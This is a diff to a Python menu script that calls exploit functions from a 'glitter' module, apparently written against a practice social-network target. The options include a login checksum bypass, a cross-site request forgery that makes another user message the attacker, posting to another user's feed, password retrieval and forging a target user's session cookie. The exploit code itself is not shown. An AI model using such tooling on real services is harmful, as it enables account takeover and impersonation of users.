@@ -10,9 +10,9 @@ def print_menu():
 
 
 def main():
+    glitter.username = input("Enter your username: ")
+    glitter.password = input("Enter your password: ")
     while True:
-        glitter.username = input("Enter your username: ")
-        glitter.password = input("Enter your password: ")
         print_menu()
         choice = int(input("\nEnter your choice: "))
         if choice == 0:
@@ -24,7 +24,7 @@ def main():
             if glitter.sock:
                 glitter.sock.close()
         elif choice in range(1, 13):
-            glitter.login_with_checksum_bypass("!@#098")
+            glitter.login_with_checksum_bypass(glitter.username, glitter.password)
             if choice == 2:
                 glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
                 count = int(input("Enter the amount of likes you would like to do: "))
@@ -62,15 +62,16 @@ def main():
         elif int(choice) in range(12, 16):
             glitter.login_website()
             if choice == 13:
-                glitter.target_user_id = input("Enter the target's user_id you want him to send a message to you (for example: 22779): ")
-                glitter.xsrf_send_message_to_yourself_from_another_user(glitter.target_user_id)
+                publisher_id = input("Enter the target's user_id you want him to send a message to you (for example: 22779): ")
+                glitter.xsrf_send_message_to_yourself_from_another_user(publisher_id)
             elif choice == 14:
                 glitter.target_user_id = input("Enter the target's user_id you want to send a video to (for example: 22779): ")
                 glitter.post_video_to_another_user_feed()
             elif choice == 15:
+                print("Currently isn't available")
                 glitter.get_password()
         elif choice == 16:
-            target_username = input("Enter the target's username (for example: !@##@!")
+            target_username = input("Enter the target's username (for example: !@##@!): ")
             print("The cookie of " + target_username + ": " + glitter.generate_cookie(target_username))
             if glitter.sock:
                 glitter.sock.close()
